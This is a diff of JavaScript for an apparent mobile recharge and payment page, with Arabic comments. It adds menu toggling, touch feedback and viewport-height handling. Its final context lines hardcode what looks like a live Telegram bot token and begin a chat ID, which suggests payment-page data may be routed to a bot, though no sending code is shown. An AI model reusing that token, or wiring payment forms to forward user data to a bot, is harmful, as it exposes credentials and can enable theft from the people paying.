@@ -1,5 +1,64 @@
 
 document.addEventListener('DOMContentLoaded', function() {
+        // إضافة وظيفة زر القائمة للهواتف المحمولة
+        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+        const navMenu = document.querySelector('nav ul');
+        
+        if(mobileMenuBtn) {
+            mobileMenuBtn.addEventListener('click', function() {
+                navMenu.classList.toggle('show');
+            });
+        }
+        
+        // حدث لإغلاق القائمة عند النقر على أي رابط
+        const navLinks = document.querySelectorAll('nav ul li a');
+        navLinks.forEach(link => {
+            link.addEventListener('click', function() {
+                if(window.innerWidth <= 600) {
+                    navMenu.classList.remove('show');
+                }
+            });
+        });
+        
+        // إغلاق القائمة عند النقر خارجها
+        document.addEventListener('click', function(event) {
+            if (window.innerWidth <= 600) {
+                const isClickInsideNav = navMenu.contains(event.target);
+                const isClickOnMenuBtn = mobileMenuBtn.contains(event.target);
+                
+                if (!isClickInsideNav && !isClickOnMenuBtn && navMenu.classList.contains('show')) {
+                    navMenu.classList.remove('show');
+                }
+            }
+        });
+        
+        // إضافة تمرير سلس لمحتوى الخطوات
+        const rechargeSteps = document.querySelector('.recharge-steps');
+        if(rechargeSteps) {
+            // تمكين التمرير باللمس لعناصر الخطوات
+            rechargeSteps.style.webkitOverflowScrolling = 'touch';
+        }
+        
+        // تحسين تجربة النقر على عناصر القابلة للنقر على الأجهزة التي تعمل باللمس
+        const clickableElements = document.querySelectorAll('.btn, .account-number, .offer label, .payment-option label');
+        clickableElements.forEach(element => {
+            element.addEventListener('touchstart', function() {
+                this.style.transform = 'scale(0.98)';
+            });
+            
+            element.addEventListener('touchend', function() {
+                this.style.transform = 'scale(1)';
+            });
+        });
+        
+        // تتبع ارتفاع الشاشة لمعالجة مشكلة لوحة المفاتيح في الهاتف المحمول
+        let vh = window.innerHeight * 0.01;
+        document.documentElement.style.setProperty('--vh', `${vh}px`);
+        
+        window.addEventListener('resize', () => {
+            vh = window.innerHeight * 0.01;
+            document.documentElement.style.setProperty('--vh', `${vh}px`);
+        });
     // تعريف متغير عالمي لقيمة TOKEN الخاص ببوت التلغرام
     const TELEGRAM_BOT_TOKEN = '7851317086:AAHpPMXMFVg8aPv4C65fruS8aYqQrEAthE0';
     // تعيين معرف الدردشة الخاص بك (سنستخدم قيمة افتراضية هنا، يمكنك تعديلها)
